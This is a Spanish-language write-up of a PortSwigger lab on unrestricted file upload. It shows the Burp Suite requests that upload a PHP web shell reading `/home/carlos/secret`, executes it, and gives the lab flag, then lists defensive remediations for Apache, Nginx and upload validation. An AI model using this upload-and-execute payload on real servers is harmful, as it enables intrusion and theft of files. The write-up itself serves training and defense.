# Lab: Remote code execution via web shell upload

**Plataforma:** PortSwigger Web Security Academy  
**Categoría:** File upload vulnerabilities  
**Dificultad:** Apprentice  
**URL del Lab:** [Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)  

---

## 📌 Enunciado

> La función de subida de imágenes de avatar en la aplicación es vulnerable. No realiza ningún tipo de validación sobre los archivos que los usuarios suben antes de almacenarlos en el sistema de archivos del servidor.
>
> **Objetivo:** Subir una web shell básica en PHP y utilizarla para exfiltrar el contenido del archivo sensible `/home/carlos/secret`. Ingresar dicho secreto utilizando el botón "Submit solution" en el banner del laboratorio.
>
> **Credenciales:** `wiener:peter`

---

## 🔍 Reconocimiento y Análisis de la Petición

1. Se inicia sesión con las credenciales provistas `wiener:peter` y se accede al panel de usuario en `/my-account`.
2. Se intenta subir una imagen válida como avatar mediante el formulario, interceptando el tráfico con **Burp Suite Proxy**.
3. La petición HTTP resultante corresponde a un método `POST` sobre `/my-account/avatar` con encabezado `Content-Type: multipart/form-data`:

```http
POST /my-account/avatar HTTP/2
Host: <LAB-ID>.web-security-academy.net
Cookie: session=eMTaGtyDtKJhKnggbvmBIWYZBHI9rVlf
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqJwz5xN9G48Y1eWU

------WebKitFormBoundaryqJwz5xN9G48Y1eWU
Content-Disposition: form-data; name="avatar"; filename="avatar.png"
Content-Type: image/png

[... bytes binarios de la imagen ...]
------WebKitFormBoundaryqJwz5xN9G48Y1eWU
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryqJwz5xN9G48Y1eWU
Content-Disposition: form-data; name="csrf"

<TOKEN_CSRF>
------WebKitFormBoundaryqJwz5xN9G48Y1eWU--
```

4. **Estructura del Formulario:**
   El backend valida la presencia obligatoria de 3 campos en el cuerpo multipart:
   - `avatar`: El archivo enviado.
   - `user`: El identificador del usuario autenticado (`wiener`). Si se omite, el servidor responde con `400 Bad Request` indicando `"No user param supplied"`.
   - `csrf`: Token de sincronización anti-CSRF. Si falta o no coincide con la sesión, el servidor devuelve error de validación.

---

## 🔬 Identificación de la Vulnerabilidad

- **CWE-434: Unrestricted Upload of File with Dangerous Type**  
  El servidor no realiza ninguna verificación sobre:
  1. La extensión del nombre de archivo (`filename="exploit.php"`).
  2. El encabezado de tipo MIME (`Content-Type`).
  3. Los *magic bytes* del archivo para corroborar su estructura de imagen real.
- **Configuración Insegura del Servidor Web:**
  El directorio de almacenamiento estático (`/files/avatars/`) se encuentra dentro de la raíz web del servidor (*webroot*) y cuenta con permisos de ejecución asignados al intérprete de PHP (FastCGI / mod_php).

---

## 🚀 Explotación Paso a Paso con Burp Suite Repeater

### 1. Preparación del Payload en Repeater

Se envía la solicitud de subida a **Burp Suite Repeater** (`Ctrl + R`) y se modifica la sección del archivo `avatar`:
- **Nombre de archivo:** `exploit.php`
- **Content-Type:** `application/x-php`
- **Cuerpo del archivo:** Código PHP que invoca `file_get_contents()` para leer la ruta del sistema operativo solicitada:

```http
POST /my-account/avatar HTTP/2
Host: <LAB-ID>.web-security-academy.net
Cookie: session=eMTaGtyDtKJhKnggbvmBIWYZBHI9rVlf
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqJwz5xN9G48Y1eWU

------WebKitFormBoundaryqJwz5xN9G48Y1eWU
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryqJwz5xN9G48Y1eWU
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryqJwz5xN9G48Y1eWU
Content-Disposition: form-data; name="csrf"

s27jV0iKjQW4U2ZgVwQ2hDq...
------WebKitFormBoundaryqJwz5xN9G48Y1eWU--
```

### 2. Respuesta del Servidor al Almacenar el Script

Al enviar la petición, el backend procesa la carga y confirma el almacenamiento en el directorio público:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8

The file avatars/exploit.php has been uploaded.
```

### 3. Ejecución de la Web Shell y Exfiltración

Se realiza una solicitud `GET` directa al recurso subido en `/files/avatars/exploit.php`:

```http
GET /files/avatars/exploit.php HTTP/2
Host: <LAB-ID>.web-security-academy.net
Cookie: session=eMTaGtyDtKJhKnggbvmBIWYZBHI9rVlf
```

El servidor web interpreta el archivo mediante el motor PHP, ejecutando la lectura de `/home/carlos/secret` y arrojando el token en texto claro en el cuerpo de la respuesta:

```http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8

ucYIlOvC2Gsi0BpYVIpRyHjRbvub5AOP
```

---

## 🏁 Flag / Secreto Obtenido

```text
ucYIlOvC2Gsi0BpYVIpRyHjRbvub5AOP
```

El laboratorio queda marcado como **SOLVED** tras enviar la solución.

---

## 🛡️ Causa Raíz y Remediaciones Defensivas (OWASP)

### Causa Raíz
La aplicación almacena archivos provistos por el usuario directamente en el árbol web sin validar extensiones ni firmas de archivo, combinado con un servidor web que permite la ejecución de scripts del lado del servidor dentro del directorio de carga.

### Remediaciones Recomendadas
1. **Deshabilitar la ejecución de scripts en directorios de subida:**
   - En **Apache**, configurar directivas en la configuración principal o `.htaccess`:
     ```apache
     <Directory "/var/www/avatars">
         php_flag engine off
         RemoveHandler .php .phtml .php3 .php4 .php5 .php7
     </Directory>
     ```
   - En **Nginx**, evitar enrutar peticiones del directorio estático al procesador PHP:
     ```nginx
     location /files/avatars/ {
         # Solo sirve archivos estáticos, no pasa a FastCGI
     }
     ```
2. **Validación estricta de extensiones por lista blanca (Whitelist):**
   - Permitir exclusivamente extensiones seguras (`.jpg`, `.jpeg`, `.png`, `.webp`).
   - Rechazar extensiones ejecutables o con sufijos dobles (`.php`, `.php5`, `.phtml`, `.phar`).
3. **Validación de contenido y re-encoding:**
   - Inspeccionar los *magic bytes* del archivo para asegurar que la estructura binaria corresponda a una imagen real.
   - Procesar la imagen con una librería gráfica del servidor (como `GD` o `ImageMagick`) para re-codificarla y recrearla desde cero, despojándola de cualquier payload embebido.
4. **Almacenamiento fuera de la raíz web:**
   - Almacenar los archivos fuera del directorio público servible por el servidor web (o en un servicio de almacenamiento de objetos independiente como Amazon S3, Google Cloud Storage) y descargarlos mediante un controlador que fuerce cabeceras seguras:
     ```http
     Content-Type: image/png
     Content-Disposition: inline; filename="avatar.png"
     X-Content-Type-Options: nosniff
     ```
